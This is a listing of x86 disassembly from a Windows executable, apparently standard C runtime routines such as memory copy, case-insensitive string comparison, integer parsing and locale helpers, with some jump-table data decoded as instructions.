  428378:	mov    ecx,DWORD PTR [ebp+0x10]
  42837b:	mov    edi,DWORD PTR [ebp+0x8]
  42837e:	mov    eax,ecx
  428380:	mov    edx,ecx
  428382:	add    eax,esi
  428384:	cmp    edi,esi
  428386:	jbe    0x428390
  428388:	cmp    edi,eax
  42838a:	jb     0x42850c
  428390:	test   edi,0x3
  428396:	jne    0x4283ac
  428398:	shr    ecx,0x2
  42839b:	and    edx,0x3
  42839e:	cmp    ecx,0x8
  4283a1:	jb     0x4283cc
  4283a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283a5:	jmp    DWORD PTR [edx*4+0x4284bc]
  4283ac:	mov    eax,edi
  4283ae:	mov    edx,0x3
  4283b3:	sub    ecx,0x4
  4283b6:	jb     0x4283c4
  4283b8:	and    eax,0x3
  4283bb:	add    ecx,eax
  4283bd:	jmp    DWORD PTR [eax*4+0x4283d0]
  4283c4:	jmp    DWORD PTR [ecx*4+0x4284cc]
  4283cb:	nop
  4283cc:	jmp    DWORD PTR [ecx*4+0x428450]
  4283d3:	nop
  4283d4:	loopne 0x428359
  4283d6:	inc    edx
  4283d7:	add    BYTE PTR [esp+eax*4],cl
  4283da:	inc    edx
  4283db:	add    BYTE PTR [eax],dh
  4283dd:	test   BYTE PTR [edx+0x0],al
  4283e0:	and    edx,ecx
  4283e2:	mov    al,BYTE PTR [esi]
  4283e4:	mov    BYTE PTR [edi],al
  4283e6:	mov    al,BYTE PTR [esi+0x1]
  4283e9:	mov    BYTE PTR [edi+0x1],al
  4283ec:	mov    al,BYTE PTR [esi+0x2]
  4283ef:	shr    ecx,0x2
  4283f2:	mov    BYTE PTR [edi+0x2],al
  4283f5:	add    esi,0x3
  4283f8:	add    edi,0x3
  4283fb:	cmp    ecx,0x8
  4283fe:	jb     0x4283cc
  428400:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428402:	jmp    DWORD PTR [edx*4+0x4284bc]
  428409:	lea    ecx,[ecx+0x0]
  42840c:	and    edx,ecx
  42840e:	mov    al,BYTE PTR [esi]
  428410:	mov    BYTE PTR [edi],al
  428412:	mov    al,BYTE PTR [esi+0x1]
  428415:	shr    ecx,0x2
  428418:	mov    BYTE PTR [edi+0x1],al
  42841b:	add    esi,0x2
  42841e:	add    edi,0x2
  428421:	cmp    ecx,0x8
  428424:	jb     0x4283cc
  428426:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428428:	jmp    DWORD PTR [edx*4+0x4284bc]
  42842f:	nop
  428430:	and    edx,ecx
  428432:	mov    al,BYTE PTR [esi]
  428434:	mov    BYTE PTR [edi],al
  428436:	add    esi,0x1
  428439:	shr    ecx,0x2
  42843c:	add    edi,0x1
  42843f:	cmp    ecx,0x8
  428442:	jb     0x4283cc
  428444:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428446:	jmp    DWORD PTR [edx*4+0x4284bc]
  42844d:	lea    ecx,[ecx+0x0]
  428450:	mov    bl,0x84
  428452:	inc    edx
  428453:	add    BYTE PTR [eax-0x67ffbd7c],ah
  428459:	test   BYTE PTR [edx+0x0],al
  42845c:	nop
  42845d:	test   BYTE PTR [edx+0x0],al
  428460:	mov    BYTE PTR [edx+eax*2+0x42848000],al
  428467:	add    BYTE PTR [eax-0x7c],bh
  42846a:	inc    edx
  42846b:	add    BYTE PTR [eax-0x7c],dh
  42846e:	inc    edx
  42846f:	add    BYTE PTR [ebx-0x761b71bc],cl
  428475:	inc    esp
  428476:	(bad)  
  428477:	in     al,0x8b
  428479:	inc    esp
  42847a:	mov    gs,eax
  42847c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  428480:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  428484:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  428488:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42848c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  428490:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  428494:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  428498:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42849c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4284a0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4284a4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4284a8:	lea    eax,[ecx*4+0x0]
  4284af:	add    esi,eax
  4284b1:	add    edi,eax
  4284b3:	jmp    DWORD PTR [edx*4+0x4284bc]
  4284ba:	mov    edi,edi
  4284bc:	int3   
  4284bd:	test   BYTE PTR [edx+0x0],al
  4284c0:	aam    0x84
  4284c2:	inc    edx
  4284c3:	add    al,ah
  4284c5:	test   BYTE PTR [edx+0x0],al
  4284c8:	hlt    
  4284c9:	test   BYTE PTR [edx+0x0],al
  4284cc:	mov    eax,DWORD PTR [ebp+0x8]
  4284cf:	pop    esi
  4284d0:	pop    edi
  4284d1:	leave  
  4284d2:	ret    
  4284d3:	nop
  4284d4:	mov    al,BYTE PTR [esi]
  4284d6:	mov    BYTE PTR [edi],al
  4284d8:	mov    eax,DWORD PTR [ebp+0x8]
  4284db:	pop    esi
  4284dc:	pop    edi
  4284dd:	leave  
  4284de:	ret    
  4284df:	nop
  4284e0:	mov    al,BYTE PTR [esi]
  4284e2:	mov    BYTE PTR [edi],al
  4284e4:	mov    al,BYTE PTR [esi+0x1]
  4284e7:	mov    BYTE PTR [edi+0x1],al
  4284ea:	mov    eax,DWORD PTR [ebp+0x8]
  4284ed:	pop    esi
  4284ee:	pop    edi
  4284ef:	leave  
  4284f0:	ret    
  4284f1:	lea    ecx,[ecx+0x0]
  4284f4:	mov    al,BYTE PTR [esi]
  4284f6:	mov    BYTE PTR [edi],al
  4284f8:	mov    al,BYTE PTR [esi+0x1]
  4284fb:	mov    BYTE PTR [edi+0x1],al
  4284fe:	mov    al,BYTE PTR [esi+0x2]
  428501:	mov    BYTE PTR [edi+0x2],al
  428504:	mov    eax,DWORD PTR [ebp+0x8]
  428507:	pop    esi
  428508:	pop    edi
  428509:	leave  
  42850a:	ret    
  42850b:	nop
  42850c:	lea    esi,[ecx+esi*1-0x4]
  428510:	lea    edi,[ecx+edi*1-0x4]
  428514:	test   edi,0x3
  42851a:	jne    0x428540
  42851c:	shr    ecx,0x2
  42851f:	and    edx,0x3
  428522:	cmp    ecx,0x8
  428525:	jb     0x428534
  428527:	std    
  428528:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42852a:	cld    
  42852b:	jmp    DWORD PTR [edx*4+0x428658]
  428532:	mov    edi,edi
  428534:	neg    ecx
  428536:	jmp    DWORD PTR [ecx*4+0x428608]
  42853d:	lea    ecx,[ecx+0x0]
  428540:	mov    eax,edi
  428542:	mov    edx,0x3
  428547:	cmp    ecx,0x4
  42854a:	jb     0x428558
  42854c:	and    eax,0x3
  42854f:	sub    ecx,eax
  428551:	jmp    DWORD PTR [eax*4+0x42855c]
  428558:	jmp    DWORD PTR [ecx*4+0x428658]
  42855f:	nop
  428560:	ins    BYTE PTR es:[edi],dx
  428561:	test   DWORD PTR [edx+0x0],eax
  428564:	nop
  428565:	test   DWORD PTR [edx+0x0],eax
  428568:	mov    eax,0x8a004285
  42856d:	inc    esi
  42856e:	add    esp,DWORD PTR [ebx]
  428570:	ror    DWORD PTR [eax-0x117cfcb9],1
  428576:	add    ecx,eax
  428578:	jmp    0x232087f
  42857d:	cmp    ecx,0x8
  428580:	jb     0x428534
  428582:	std    
  428583:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428585:	cld    
  428586:	jmp    DWORD PTR [edx*4+0x428658]
  42858d:	lea    ecx,[ecx+0x0]
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	and    edx,ecx
  428595:	mov    BYTE PTR [edi+0x3],al
  428598:	mov    al,BYTE PTR [esi+0x2]
  42859b:	shr    ecx,0x2
  42859e:	mov    BYTE PTR [edi+0x2],al
  4285a1:	sub    esi,0x2
  4285a4:	sub    edi,0x2
  4285a7:	cmp    ecx,0x8
  4285aa:	jb     0x428534
  4285ac:	std    
  4285ad:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4285af:	cld    
  4285b0:	jmp    DWORD PTR [edx*4+0x428658]
  4285b7:	nop
  4285b8:	mov    al,BYTE PTR [esi+0x3]
  4285bb:	and    edx,ecx
  4285bd:	mov    BYTE PTR [edi+0x3],al
  4285c0:	mov    al,BYTE PTR [esi+0x2]
  4285c3:	mov    BYTE PTR [edi+0x2],al
  4285c6:	mov    al,BYTE PTR [esi+0x1]
  4285c9:	shr    ecx,0x2
  4285cc:	mov    BYTE PTR [edi+0x1],al
  4285cf:	sub    esi,0x3
  4285d2:	sub    edi,0x3
  4285d5:	cmp    ecx,0x8
  4285d8:	jb     0x428534
  4285de:	std    
  4285df:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4285e1:	cld    
  4285e2:	jmp    DWORD PTR [edx*4+0x428658]
  4285e9:	lea    ecx,[ecx+0x0]
  4285ec:	or     al,0x86
  4285ee:	inc    edx
  4285ef:	add    BYTE PTR [esi+eax*4],dl
  4285f2:	inc    edx
  4285f3:	add    BYTE PTR [esi+eax*4],bl
  4285f6:	inc    edx
  4285f7:	add    BYTE PTR [esi+eax*4],ah
  4285fa:	inc    edx
  4285fb:	add    BYTE PTR [esi+eax*4],ch
  4285fe:	inc    edx
  4285ff:	add    BYTE PTR [esi+eax*4],dh
  428602:	inc    edx
  428603:	add    BYTE PTR [esi+eax*4],bh
  428606:	inc    edx
  428607:	add    BYTE PTR [edi-0x7a],cl
  42860a:	inc    edx
  42860b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428611:	inc    esp
  428612:	(bad)  
  428613:	sbb    al,0x8b
  428615:	inc    esp
  428616:	mov    ds,WORD PTR [eax]
  428618:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42861c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428620:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428624:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428628:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42862c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428630:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428634:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428638:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42863c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428640:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428644:	lea    eax,[ecx*4+0x0]
  42864b:	add    esi,eax
  42864d:	add    edi,eax
  42864f:	jmp    DWORD PTR [edx*4+0x428658]
  428656:	mov    edi,edi
  428658:	push   0x70004286
  42865d:	xchg   BYTE PTR [edx+0x0],al
  428660:	add    BYTE PTR [esi-0x796bffbe],0x42
  428667:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42866d:	leave  
  42866e:	ret    
  42866f:	nop
  428670:	mov    al,BYTE PTR [esi+0x3]
  428673:	mov    BYTE PTR [edi+0x3],al
  428676:	mov    eax,DWORD PTR [ebp+0x8]
  428679:	pop    esi
  42867a:	pop    edi
  42867b:	leave  
  42867c:	ret    
  42867d:	lea    ecx,[ecx+0x0]
  428680:	mov    al,BYTE PTR [esi+0x3]
  428683:	mov    BYTE PTR [edi+0x3],al
  428686:	mov    al,BYTE PTR [esi+0x2]
  428689:	mov    BYTE PTR [edi+0x2],al
  42868c:	mov    eax,DWORD PTR [ebp+0x8]
  42868f:	pop    esi
  428690:	pop    edi
  428691:	leave  
  428692:	ret    
  428693:	nop
  428694:	mov    al,BYTE PTR [esi+0x3]
  428697:	mov    BYTE PTR [edi+0x3],al
  42869a:	mov    al,BYTE PTR [esi+0x2]
  42869d:	mov    BYTE PTR [edi+0x2],al
  4286a0:	mov    al,BYTE PTR [esi+0x1]
  4286a3:	mov    BYTE PTR [edi+0x1],al
  4286a6:	mov    eax,DWORD PTR [ebp+0x8]
  4286a9:	pop    esi
  4286aa:	pop    edi
  4286ab:	leave  
  4286ac:	ret    
  4286ad:	push   ebp
  4286ae:	mov    ebp,esp
  4286b0:	sub    esp,0xc
  4286b3:	mov    eax,ds:0x462f30
  4286b8:	xor    eax,DWORD PTR [ebp+0x4]
  4286bb:	and    BYTE PTR [ebp-0x6],0x0
  4286bf:	push   0x6
  4286c1:	mov    DWORD PTR [ebp-0x4],eax
  4286c4:	lea    eax,[ebp-0xc]
  4286c7:	push   eax
  4286c8:	push   0x1004
  4286cd:	push   DWORD PTR [ebp+0x8]
  4286d0:	call   DWORD PTR ds:0x429138
  4286d6:	test   eax,eax
  4286d8:	jne    0x4286df
  4286da:	or     eax,0xffffffff
  4286dd:	jmp    0x4286e9
  4286df:	lea    eax,[ebp-0xc]
  4286e2:	push   eax
  4286e3:	call   0x4289ee
  4286e8:	pop    ecx
  4286e9:	mov    ecx,DWORD PTR [ebp-0x4]
  4286ec:	xor    ecx,DWORD PTR [ebp+0x4]
  4286ef:	call   0x425afc
  4286f4:	leave  
  4286f5:	ret    
  4286f6:	push   0x38
  4286f8:	push   0x42a000
  4286fd:	call   0x425434
  428702:	mov    eax,ds:0x462f30
  428707:	xor    eax,DWORD PTR [ebp+0x4]
  42870a:	mov    DWORD PTR [ebp-0x1c],eax
  42870d:	xor    edi,edi
  42870f:	mov    DWORD PTR [ebp-0x20],edi
  428712:	mov    DWORD PTR [ebp-0x24],edi
  428715:	mov    eax,DWORD PTR [ebp+0x14]
  428718:	mov    ebx,DWORD PTR [eax]
  42871a:	mov    DWORD PTR [ebp-0x28],ebx
  42871d:	mov    DWORD PTR [ebp-0x2c],edi
  428720:	mov    eax,DWORD PTR [ebp+0x8]
  428723:	cmp    eax,DWORD PTR [ebp+0xc]
  428726:	je     0x42889f
  42872c:	lea    ecx,[ebp-0x40]
  42872f:	push   ecx
  428730:	push   eax
  428731:	mov    esi,DWORD PTR ds:0x429104
  428737:	call   esi
  428739:	test   eax,eax
  42873b:	je     0x42875d
  42873d:	cmp    DWORD PTR [ebp-0x40],0x1
  428741:	jne    0x42875d
  428743:	lea    eax,[ebp-0x40]
  428746:	push   eax
  428747:	push   DWORD PTR [ebp+0xc]
  42874a:	call   esi
  42874c:	test   eax,eax
  42874e:	je     0x42875d
  428750:	cmp    DWORD PTR [ebp-0x40],0x1
  428754:	jne    0x42875d
  428756:	mov    DWORD PTR [ebp-0x2c],0x1
  42875d:	cmp    DWORD PTR [ebp-0x2c],edi
  428760:	je     0x42877c
  428762:	cmp    ebx,0xffffffff
  428765:	je     0x42876b
  428767:	mov    esi,ebx
  428769:	jmp    0x428777
  42876b:	push   DWORD PTR [ebp+0x10]
  42876e:	call   0x425a40
  428773:	pop    ecx
  428774:	mov    esi,eax
  428776:	inc    esi
  428777:	mov    DWORD PTR [ebp-0x44],esi
  42877a:	jmp    0x42877f
  42877c:	mov    esi,DWORD PTR [ebp-0x44]
  42877f:	cmp    DWORD PTR [ebp-0x2c],edi
  428782:	jne    0x42879e
  428784:	push   edi
  428785:	push   edi
  428786:	push   ebx
  428787:	push   DWORD PTR [ebp+0x10]
  42878a:	push   0x1
  42878c:	push   DWORD PTR [ebp+0x8]
  42878f:	call   DWORD PTR ds:0x429128
  428795:	mov    esi,eax
  428797:	mov    DWORD PTR [ebp-0x44],esi
  42879a:	cmp    esi,edi
  42879c:	je     0x4287f6
  42879e:	mov    DWORD PTR [ebp-0x4],edi
  4287a1:	lea    eax,[esi+esi*1]
  4287a4:	add    eax,0x3
  4287a7:	and    eax,0xfffffffc
  4287aa:	call   0x425480
  4287af:	mov    DWORD PTR [ebp-0x18],esp
  4287b2:	mov    ebx,esp
  4287b4:	mov    DWORD PTR [ebp-0x48],ebx
  4287b7:	lea    eax,[esi+esi*1]
  4287ba:	push   eax
  4287bb:	push   edi
  4287bc:	push   ebx
  4287bd:	call   0x427d30
  4287c2:	add    esp,0xc
  4287c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4287c9:	jmp    0x4287e2
  4287cb:	xor    eax,eax
  4287cd:	inc    eax
  4287ce:	ret    
  4287cf:	mov    esp,DWORD PTR [ebp-0x18]
  4287d2:	call   0x4288c5
  4287d7:	xor    edi,edi
  4287d9:	xor    ebx,ebx
  4287db:	or     DWORD PTR [ebp-0x4],0xffffffff
  4287df:	mov    esi,DWORD PTR [ebp-0x44]
  4287e2:	cmp    ebx,edi
  4287e4:	jne    0x428804
  4287e6:	push   esi
  4287e7:	push   0x2
  4287e9:	call   0x426548
  4287ee:	pop    ecx
  4287ef:	pop    ecx
  4287f0:	mov    ebx,eax
  4287f2:	cmp    ebx,edi
  4287f4:	jne    0x4287fd
  4287f6:	xor    eax,eax
  4287f8:	jmp    0x4288b1
  4287fd:	mov    DWORD PTR [ebp-0x24],0x1
  428804:	push   esi
  428805:	push   ebx
  428806:	push   DWORD PTR [ebp-0x28]
  428809:	push   DWORD PTR [ebp+0x10]
  42880c:	push   0x1
  42880e:	push   DWORD PTR [ebp+0x8]
  428811:	call   DWORD PTR ds:0x429128
  428817:	test   eax,eax
  428819:	je     0x4288a2
  42881f:	cmp    DWORD PTR [ebp+0x18],edi
  428822:	je     0x428844
  428824:	push   edi
  428825:	push   edi
  428826:	push   DWORD PTR [ebp+0x1c]
  428829:	push   DWORD PTR [ebp+0x18]
  42882c:	push   esi
  42882d:	push   ebx
  42882e:	push   edi
  42882f:	push   DWORD PTR [ebp+0xc]
  428832:	call   DWORD PTR ds:0x4290bc
  428838:	test   eax,eax
  42883a:	je     0x4288a2
  42883c:	mov    eax,DWORD PTR [ebp+0x18]
  42883f:	mov    DWORD PTR [ebp-0x20],eax
  428842:	jmp    0x4288a2
  428844:	cmp    DWORD PTR [ebp-0x2c],edi
  428847:	jne    0x42885f
  428849:	push   edi
  42884a:	push   edi
  42884b:	push   edi
  42884c:	push   edi
  42884d:	push   esi
  42884e:	push   ebx
  42884f:	push   edi
  428850:	push   DWORD PTR [ebp+0xc]
  428853:	call   DWORD PTR ds:0x4290bc
  428859:	mov    esi,eax
  42885b:	cmp    esi,edi
  42885d:	je     0x4288a2
  42885f:	push   esi
  428860:	push   0x1
  428862:	call   0x426548
  428867:	pop    ecx
  428868:	pop    ecx
  428869:	mov    DWORD PTR [ebp-0x20],eax
  42886c:	cmp    eax,edi
  42886e:	je     0x4288a2
  428870:	push   edi
  428871:	push   edi
  428872:	push   esi
  428873:	push   eax
  428874:	push   esi
  428875:	push   ebx
  428876:	push   edi
  428877:	push   DWORD PTR [ebp+0xc]
  42887a:	call   DWORD PTR ds:0x4290bc
  428880:	cmp    eax,edi
  428882:	jne    0x428892
  428884:	push   DWORD PTR [ebp-0x20]
  428887:	call   0x42603a
  42888c:	pop    ecx
  42888d:	mov    DWORD PTR [ebp-0x20],edi
  428890:	jmp    0x4288a2
  428892:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  428896:	je     0x4288a2
  428898:	mov    ecx,DWORD PTR [ebp+0x14]
  42889b:	mov    DWORD PTR [ecx],eax
  42889d:	jmp    0x4288a2
  42889f:	mov    ebx,DWORD PTR [ebp-0x48]
  4288a2:	cmp    DWORD PTR [ebp-0x24],edi
  4288a5:	je     0x4288ae
  4288a7:	push   ebx
  4288a8:	call   0x42603a
  4288ad:	pop    ecx
  4288ae:	mov    eax,DWORD PTR [ebp-0x20]
  4288b1:	lea    esp,[ebp-0x54]
  4288b4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4288b7:	xor    ecx,DWORD PTR [ebp+0x4]
  4288ba:	call   0x425afc
  4288bf:	call   0x42546f
  4288c4:	ret    
  4288c5:	push   ebp
  4288c6:	mov    ebp,esp
  4288c8:	sub    esp,0x48
  4288cb:	push   ebx
  4288cc:	push   esi
  4288cd:	push   edi
  4288ce:	push   0x4
  4288d0:	pop    eax
  4288d1:	call   0x425480
  4288d6:	mov    ebx,esp
  4288d8:	push   0x1c
  4288da:	lea    eax,[ebp-0x24]
  4288dd:	push   eax
  4288de:	push   ebx
  4288df:	call   DWORD PTR ds:0x429054
  4288e5:	test   eax,eax
  4288e7:	je     0x42895a
  4288e9:	mov    edi,DWORD PTR [ebp-0x20]
  4288ec:	lea    eax,[ebp-0x48]
  4288ef:	push   eax
  4288f0:	call   DWORD PTR ds:0x42908c
  4288f6:	mov    eax,DWORD PTR [ebp-0x44]
  4288f9:	lea    esi,[eax-0x1]
  4288fc:	not    esi
  4288fe:	and    esi,ebx
  428900:	sub    esi,eax
  428902:	mov    DWORD PTR [ebp-0x4],eax
  428905:	mov    eax,ds:0x4635c4
  42890a:	mov    ecx,eax
  42890c:	dec    ecx
  42890d:	neg    ecx
  42890f:	sbb    ecx,ecx
  428911:	and    ecx,0xffff1000
  428917:	add    ecx,0x11000
  42891d:	add    ecx,edi
  42891f:	cmp    esi,ecx
  428921:	jb     0x42895a
  428923:	cmp    eax,0x1
  428926:	je     0x428972
  428928:	mov    ebx,edi
  42892a:	mov    edi,0x1000
  42892f:	push   0x1c
  428931:	lea    eax,[ebp-0x24]
  428934:	push   eax
  428935:	push   ebx
  428936:	call   DWORD PTR ds:0x429054
  42893c:	test   eax,eax
  42893e:	je     0x42895a
  428940:	add    ebx,DWORD PTR [ebp-0x18]
  428943:	test   DWORD PTR [ebp-0x14],edi
  428946:	je     0x42892f
  428948:	test   BYTE PTR [ebp-0xf],0x1
  42894c:	mov    ebx,DWORD PTR [ebp-0x24]
  42894f:	je     0x428956
  428951:	xor    eax,eax
  428953:	inc    eax
  428954:	jmp    0x42898e
  428956:	cmp    esi,ebx
  428958:	jae    0x42895e
  42895a:	xor    eax,eax
  42895c:	jmp    0x42898e
  42895e:	push   0x4
  428960:	push   edi
  428961:	push   DWORD PTR [ebp-0x4]
  428964:	push   ebx
  428965:	call   DWORD PTR ds:0x429058
  42896b:	mov    eax,ds:0x4635c4
  428970:	jmp    0x428974
  428972:	mov    ebx,esi
  428974:	dec    eax
  428975:	neg    eax
  428977:	sbb    eax,eax
  428979:	and    eax,0x103
  42897e:	lea    ecx,[ebp-0x8]
  428981:	push   ecx
  428982:	inc    eax
  428983:	push   eax
  428984:	push   DWORD PTR [ebp-0x4]
  428987:	push   ebx
  428988:	call   DWORD PTR ds:0x42906c
  42898e:	lea    esp,[ebp-0x54]
  428991:	pop    edi
  428992:	pop    esi
  428993:	pop    ebx
  428994:	leave  
  428995:	ret    
  428996:	int3   
  428997:	int3   
  428998:	int3   
  428999:	int3   
  42899a:	int3   
  42899b:	int3   
  42899c:	int3   
  42899d:	int3   
  42899e:	int3   
  42899f:	int3   
  4289a0:	push   ebp
  4289a1:	mov    ebp,esp
  4289a3:	push   edi
  4289a4:	push   esi
  4289a5:	push   ebx
  4289a6:	mov    esi,DWORD PTR [ebp+0xc]
  4289a9:	mov    edi,DWORD PTR [ebp+0x8]
  4289ac:	mov    al,0xff
  4289ae:	mov    edi,edi
  4289b0:	or     al,al
  4289b2:	je     0x4289e6
  4289b4:	mov    al,BYTE PTR [esi]
  4289b6:	add    esi,0x1
  4289b9:	mov    ah,BYTE PTR [edi]
  4289bb:	add    edi,0x1
  4289be:	cmp    ah,al
  4289c0:	je     0x4289b0
  4289c2:	sub    al,0x41
  4289c4:	cmp    al,0x1a
  4289c6:	sbb    cl,cl
  4289c8:	and    cl,0x20
  4289cb:	add    al,cl
  4289cd:	add    al,0x41
  4289cf:	xchg   al,ah
  4289d1:	sub    al,0x41
  4289d3:	cmp    al,0x1a
  4289d5:	sbb    cl,cl
  4289d7:	and    cl,0x20
  4289da:	add    al,cl
  4289dc:	add    al,0x41
  4289de:	cmp    al,ah
  4289e0:	je     0x4289b0
  4289e2:	sbb    al,al
  4289e4:	sbb    al,0xff
  4289e6:	movsx  eax,al
  4289e9:	pop    ebx
  4289ea:	pop    esi
  4289eb:	pop    edi
  4289ec:	leave  
  4289ed:	ret    
  4289ee:	push   esi
  4289ef:	push   edi
  4289f0:	call   0x4252e9
  4289f5:	mov    edi,DWORD PTR [eax+0x64]
  4289f8:	cmp    edi,DWORD PTR ds:0x46308c
  4289fe:	je     0x428a07
  428a00:	call   0x42678f
  428a05:	mov    edi,eax
  428a07:	mov    esi,DWORD PTR [esp+0xc]
  428a0b:	cmp    DWORD PTR [edi+0x28],0x1
  428a0f:	movzx  eax,BYTE PTR [esi]
  428a12:	jle    0x428a22
  428a14:	push   0x8
  428a16:	push   eax
  428a17:	push   edi
  428a18:	call   0x428a76
  428a1d:	add    esp,0xc
  428a20:	jmp    0x428a2c
  428a22:	mov    ecx,DWORD PTR [edi+0x48]
  428a25:	movzx  eax,BYTE PTR [ecx+eax*2]
  428a29:	and    eax,0x8
  428a2c:	test   eax,eax
  428a2e:	je     0x428a33
  428a30:	inc    esi
  428a31:	jmp    0x428a0b
  428a33:	movzx  ecx,BYTE PTR [esi]
  428a36:	inc    esi
  428a37:	cmp    ecx,0x2d
  428a3a:	mov    edx,ecx
  428a3c:	je     0x428a43
  428a3e:	cmp    ecx,0x2b
  428a41:	jne    0x428a47
  428a43:	movzx  ecx,BYTE PTR [esi]
  428a46:	inc    esi
  428a47:	xor    eax,eax
  428a49:	cmp    ecx,0x30
  428a4c:	jl     0x428a58
  428a4e:	cmp    ecx,0x39
  428a51:	jg     0x428a58
  428a53:	sub    ecx,0x30
  428a56:	jmp    0x428a5b
  428a58:	or     ecx,0xffffffff
  428a5b:	cmp    ecx,0xffffffff
  428a5e:	je     0x428a6c
  428a60:	lea    eax,[eax+eax*4]
  428a63:	lea    eax,[ecx+eax*2]
  428a66:	movzx  ecx,BYTE PTR [esi]
  428a69:	inc    esi
  428a6a:	jmp    0x428a49
  428a6c:	cmp    edx,0x2d
  428a6f:	pop    edi
  428a70:	pop    esi
  428a71:	jne    0x428a75
  428a73:	neg    eax
  428a75:	ret    
  428a76:	push   ebp
  428a77:	mov    ebp,esp
  428a79:	push   ecx
  428a7a:	mov    eax,DWORD PTR [ebp+0xc]
  428a7d:	lea    ecx,[eax+0x1]
  428a80:	cmp    ecx,0x100
  428a86:	mov    ecx,DWORD PTR [ebp+0x8]
  428a89:	ja     0x428a94
  428a8b:	mov    ecx,DWORD PTR [ecx+0x48]
  428a8e:	movzx  eax,WORD PTR [ecx+eax*2]
  428a92:	jmp    0x428ae8
  428a94:	push   esi
  428a95:	mov    edx,eax
  428a97:	sar    edx,0x8
  428a9a:	push   edi
  428a9b:	mov    edi,DWORD PTR [ecx+0x48]
  428a9e:	movzx  esi,dl
  428aa1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  428aa6:	pop    edi
  428aa7:	pop    esi
  428aa8:	je     0x428ab9
  428aaa:	and    BYTE PTR [ebp-0x2],0x0
  428aae:	push   0x2
  428ab0:	mov    BYTE PTR [ebp-0x3],al
  428ab3:	mov    BYTE PTR [ebp-0x4],dl
  428ab6:	pop    eax
  428ab7:	jmp    0x428ac3
  428ab9:	and    BYTE PTR [ebp-0x3],0x0
  428abd:	mov    BYTE PTR [ebp-0x4],al
  428ac0:	xor    eax,eax
  428ac2:	inc    eax
  428ac3:	push   0x1
  428ac5:	push   DWORD PTR [ecx+0x14]
  428ac8:	push   DWORD PTR [ecx+0x4]
  428acb:	lea    ecx,[ebp+0xe]
  428ace:	push   ecx
  428acf:	push   eax
  428ad0:	lea    eax,[ebp-0x4]
  428ad3:	push   eax
  428ad4:	push   0x1
  428ad6:	call   0x427b58
  428adb:	add    esp,0x1c
  428ade:	test   eax,eax
  428ae0:	jne    0x428ae4
  428ae2:	leave  
  428ae3:	ret    
  428ae4:	movzx  eax,WORD PTR [ebp+0xe]
  428ae8:	and    eax,DWORD PTR [ebp+0x10]
  428aeb:	leave  
  428aec:	ret    
  428aed:	int3   
  428aee:	int3   
  428aef:	int3   
  428af0:	mov    eax,DWORD PTR [esp+0x8]
  428af4:	mov    ecx,DWORD PTR [esp+0x10]
  428af8:	or     ecx,eax
  428afa:	mov    ecx,DWORD PTR [esp+0xc]
  428afe:	jne    0x428b09
  428b00:	mov    eax,DWORD PTR [esp+0x4]
  428b04:	mul    ecx
  428b06:	ret    0x10
  428b09:	push   ebx
  428b0a:	mul    ecx
  428b0c:	mov    ebx,eax
  428b0e:	mov    eax,DWORD PTR [esp+0x8]
  428b12:	mul    DWORD PTR [esp+0x14]
  428b16:	add    ebx,eax
  428b18:	mov    eax,DWORD PTR [esp+0x8]
  428b1c:	mul    ecx
  428b1e:	add    edx,ebx
  428b20:	pop    ebx
  428b21:	ret    0x10
  428b24:	int3   
  428b25:	int3   
  428b26:	int3   
  428b27:	int3   
  428b28:	int3   
  428b29:	int3   
  428b2a:	int3   
  428b2b:	int3   
  428b2c:	int3   
  428b2d:	int3   
  428b2e:	int3   
  428b2f:	int3   
  428b30:	push   ebp
  428b31:	mov    ebp,esp
  428b33:	push   edi
  428b34:	push   esi
  428b35:	push   ebx
  428b36:	mov    ecx,DWORD PTR [ebp+0x10]
  428b39:	or     ecx,ecx
  428b3b:	je     0x428b8a
  428b3d:	mov    esi,DWORD PTR [ebp+0x8]
  428b40:	mov    edi,DWORD PTR [ebp+0xc]
  428b43:	mov    bh,0x41
  428b45:	mov    bl,0x5a
  428b47:	mov    dh,0x20
  428b49:	lea    ecx,[ecx+0x0]
  428b4c:	mov    ah,BYTE PTR [esi]
  428b4e:	or     ah,ah
  428b50:	mov    al,BYTE PTR [edi]
  428b52:	je     0x428b7b
  428b54:	or     al,al
  428b56:	je     0x428b7b
  428b58:	add    esi,0x1
  428b5b:	add    edi,0x1
  428b5e:	cmp    ah,bh
  428b60:	jb     0x428b68
  428b62:	cmp    ah,bl
  428b64:	ja     0x428b68
  428b66:	add    ah,dh
  428b68:	cmp    al,bh
  428b6a:	jb     0x428b72
